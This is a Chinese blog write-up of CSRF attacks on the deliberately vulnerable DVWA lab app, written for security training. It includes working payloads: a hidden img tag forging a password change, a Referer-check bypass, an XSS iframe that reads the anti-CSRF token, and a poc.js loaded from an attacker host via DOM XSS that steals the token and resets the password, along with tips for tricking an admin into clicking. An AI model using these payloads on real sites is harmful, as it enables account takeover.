---
title: DVWA-CSRF手记
date: 2018-10-19 18:50:20
tags: [DVWA,CSRF]
categories: CSRF
---

# DVWA-CSRF手记

---

## LOW

### Source:

![low_001](/img/csrf/dvwa/low_001.png)

### Analysis:	

```
没有进行任何过滤,只检验两次密码是否相同；检验用burpsuite抓包后可构造url,当受害者点击后会把密码修改。
```

`http://192.168.1.110/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change`

构造短网址

![low_002](/img/csrf/dvwa/low_002.png)

诱骗管理员点击链接，需要管理员之前有登录过DVWA,(记得设置为low)并保留有session信息。

![low_003](/img/csrf/dvwa/low_003.png)

密码修改成功。

![low_004](/img/csrf/dvwa/low_004.png)

但是这样做过于明显,管理员又不是傻子。

### Process:

通过img标签的src属性构造url。

`<img src="http://suo.im/50R0sN" border="0" style="display:none;"/>`

将其藏入一个404的html页面中。

![low_005](/img/csrf/dvwa/low_005.png)

将`http://192.168.1.119/hack.html`用短链接构造后`http://suo.im/4LOi71`

![low_006](/img/csrf/dvwa/low_006.png)

![low_007](/img/csrf/dvwa/low_007.png)

查看数据库

![low_008](/img/csrf/dvwa/low_008.png)

密码已经被修改了。

![low_009](/img/csrf/dvwa/low_009.png)

## Medium

### Source:

![medium_001](/img/csrf/dvwa/medumn_001.png)

### Analysis:	

```
$_SERVER['HTTP_REFERER']:获取服务器主机
$_SERVER['HTTP_REFERER']：获取HTTP数据包中的referer参数的值,该参数表示访问到当前页面的前一页面。
eregi — 不区分大小写的正则表达式匹配
在referer中匹配服务器主机,以此来防御csrf
```

如果还按照low的做的话会发生错误。

![medium_002](/img/csrf/dvwa/medium_002.png)

修改Referer值`http://192.168.1.119/192.168.1.110.html`

![medium_003](/img/csrf/dvwa/medium_003.png)

那么方法就出来了，在我服务器目录建一个`192.168.1.110.html`的文件不就好了。内容和hack.html一模一样。

### Process:

将`http://192.168.1.119/192.168.1.110.html`用短链接构造后`http://suo.im/4Ejm74`

![medium_004](/img/csrf/dvwa/medium_004.png)

![medium_005](/img/csrf/dvwa/medium_005.png)

这个实验不算成功,发现了一个dvwa的问题，把cookie中的security改成了impossible,导致实验没法成功。去掉security=impossible再发送。

![medium_006](/img/csrf/dvwa/medium_006.png)

后来发现这是一个dvwa有时会出现的bug,重启下服务有几率解决。

查看数据库

![medium_007](/img/csrf/dvwa/medium_007.png)

密码已经修改了。

## High

### Source:

![high_001](/img/csrf/dvwa/high_001.png)

### Analysis:	

```
这里检查了tocken,tocken是包含在页面中的,所以要先获得管理员的token,这个token每次请求都会变化。
```



![high_002](/img/csrf/dvwa/high_002.png)

像medium那样做会出现一个问题,如何获取token。

本来想利用high级别的存储型xss来注入,但是绕过前端注入代码后发现下次访问依然会对长度限制。

植入xss:

`<iframe src='../csrf' onload=alert(frames[0].document.getElementsByName('user_token')[0].value)>`

![hign_003](/img/csrf/dvwa/high_003.png)

### Process:

利用DOM型。

位于攻击者服务器的poc.js文件。

```
var theUrl = 'http://192.168.1.126/vulnerabilities/csrf/';
var pass = '123456';
if (window.XMLHttpRequest){
    xmlhttp=new XMLHttpRequest();
}else{
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}
xmlhttp.withCredentials = true;
var hacked = false;
xmlhttp.onreadystatechange=function(){
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        var text = xmlhttp.responseText;
        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
        var match = text.match(regex);
        var token = match[1];
        var new_url = 'http://192.168.1.126/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'
        if(!hacked){
            alert('Got token:' + match[1]);
            hacked = true;
            xmlhttp.open("GET", new_url, false );
            xmlhttp.send();
        }
        count++;
    }
};
xmlhttp.open("GET", theUrl, false );
xmlhttp.send();  
```

![high_004](/img/csrf/dvwa/high_004.png)

`http://192.168.1.119/dvwa/vulnerabilities/xss_d/?default=English  #<script src="http://192.168.1.125/poc.js"></script>`

诱骗管理员点击即可,当然可以像之前的一样包装一下。这里就不做了。

## Impossible

### Source:

![im_001](/img/csrf/dvwa/im_001.png)

### Analysis:	

```
Impossible级别的代码利用PDO技术防御SQL注入，而CSRF不仅有token,还需要原密码，简单粗暴。
```

